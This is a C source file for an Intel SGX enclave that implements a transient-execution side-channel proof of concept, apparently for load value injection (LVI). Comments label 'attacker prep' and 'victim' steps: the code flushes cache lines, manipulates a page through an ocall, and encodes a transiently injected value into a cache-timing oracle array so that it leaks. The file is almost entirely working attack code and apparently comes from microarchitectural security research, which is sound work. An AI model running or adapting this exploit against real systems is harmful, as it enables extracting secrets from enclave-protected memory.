/*
 * Copyright (C) 2011-2017 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */
#include "sgx_trts.h"
#include "../conf.h"
#include "string.h"

inline void maccess(volatile void *p) {
  *((volatile uint64_t *)p);
}

static void flush(void *p) {
#ifdef GS
  asm volatile("clflush %%gs:0(%0)\n" : : "c"(p) : "rax");
#else
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
#endif
}


/* 
 * printf: 
 *   Invokes OCALL to display the enclave buffer to the terminal.
 */
void printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
}

uint8_t __attribute__((aligned(0x1000))) decider_variable[4096];
uint8_t __attribute__((aligned(0x1000))) input_page[4096];

void ecall_do_something(char* oracle) {
  
  decider_variable[20] = 4;

  unsigned count = 0;

  void *delay[9] = {0};

    
  while(count < 15001)
  {
    count++;
  
    //attacker prep, clears accessed and flushes variables
    //this could happen in a parallel thread or an sgx-step interrupt
    ocall_modify_page(decider_variable);
    flush(&delay[0]);
    flush(&delay[8]);

    //enable for transient value from storebuffer (should be no difference on lvi-fixed cpu)
    input_page[20] = 6;

    //victim
    //needs at least one delay like for good leakage
    //if the leakage rate is low, try more
    maccess(&delay[0]);
    maccess(&delay[8]);

    //0 gets transiently injected into the load of decider_variable here, redirecting to case 0
    //if your cpu does not have lvi mitigations, it might redirect to case 6 instead
    switch (decider_variable[20])
    {
      case 0:
        maccess(oracle + 4096 * 0);
        break;
      case 1:
        maccess(oracle + 4096 * 1);
        break;
      case 2:
        maccess(oracle + 4096 * 2);
        break;
      case 3:
        maccess(oracle + 4096 * 3);
        break;
      case 4:
        maccess(oracle + 4096 * 'a');
        break;
      case 5:
        maccess(oracle + 4096 * 5);
        break;
      case 6:
        maccess(oracle + 4096 * LEAKAGE_CHAR);
        break;
      case 7:
        maccess(oracle + 4096 * 7);
        break;
      default:
        maccess(oracle + 4096 * 8);
        break;
    }
    
    
    //attacker processing
    //this could happen in a parallel thread or an sgx-step interrupt
    ocall_check_oracle(0);
        
  }

}
